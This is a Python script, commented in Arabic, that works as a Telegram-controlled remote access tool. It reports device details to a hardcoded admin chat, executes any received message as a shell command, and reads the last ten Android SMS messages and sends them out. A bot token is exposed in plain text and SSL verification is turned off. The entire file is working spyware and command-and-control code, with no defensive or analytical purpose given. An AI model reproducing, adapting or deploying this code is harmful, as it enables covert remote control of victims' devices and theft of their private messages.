import os
import time
import subprocess
import platform
import requests
import urllib3
import certifi

# ===== معلومات البوت =====
BOT_TOKEN = '8398512881:AAEXR_zzyZBNFtCNJ0R8zD6mXC3zWZ1Ss0U'
ADMIN_ID = 6644305400
# ========================

# إيقاف تحذيرات SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def send_telegram(text):
    """إرسال رسالة إلى التليجرام"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            'chat_id': ADMIN_ID,
            'text': text[:4000],
            'parse_mode': 'HTML'
        }
        requests.post(url, data=data, timeout=10, verify=False)
    except Exception as e:
        print(f"Send error: {e}")

def execute_command(command):
    """تنفيذ أوامر النظام"""
    try:
        result = subprocess.check_output(
            command,
            shell=True,
            stderr=subprocess.STDOUT,
            timeout=10,
            universal_newlines=True
        )
        return result
    except subprocess.TimeoutExpired:
        return "⏰ Timeout (10 seconds)"
    except Exception as e:
        return f"❌ Error: {str(e)}"

def get_sms():
    """جلب الرسائل النصية (لأندرويد)"""
    try:
        # استخدام content provider (لا يحتاج روت)
        result = subprocess.check_output(
            'content query --uri content://sms/inbox --projection address:body:date --limit 10 2>/dev/null',
            shell=True,
            timeout=5,
            universal_newlines=True
        )
        if result and 'No result' not in result:
            return f"📨 **آخر 10 رسائل:**\n\n{result}"
        return "❌ لا توجد رسائل أو لا يمكن الوصول"
    except Exception as e:
        return f"❌ خطأ في جلب الرسائل: {str(e)}"

# إرسال إشعار التشغيل
device_info = f"""
🚀 **C2 System Active**
══════════════════
📱 الجهاز: {platform.node()}
💻 النظام: {platform.system()} {platform.release()}
🆔 المعرف: {os.urandom(4).hex()}
══════════════════
📌 الأوامر المتاحة:
• /sms - قراءة الرسائل
• أي أمر نظام - تنفيذ مباشر
"""
send_telegram(device_info)

# الحلقة الرئيسية
last_update = 0
while True:
    try:
        # جلب التحديثات من التليجرام
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
        params = {
            'offset': last_update,
            'timeout': 30,
            'allowed_updates': ['message']
        }
        response = requests.get(url, params=params, timeout=35, verify=False)
        data = response.json()
        
        if data.get('ok'):
            for update in data.get('result', []):
                last_update = update['update_id'] + 1
                
                # التحقق من المرسل
                message = update.get('message', {})
                chat_id = message.get('chat', {}).get('id')
                
                if chat_id == ADMIN_ID:
                    command = message.get('text', '').strip()
                    
                    if command:
                        # أوامر خاصة
                        if command == '/sms':
                            result = get_sms()
                        else:
                            result = execute_command(command)
                        
                        # إرسال النتيجة
                        send_telegram(f"```\n{result[:3500]}\n```")
        
        time.sleep(2)
        
    except Exception as e:
        print(f"Main loop error: {e}")
        time.sleep(5)
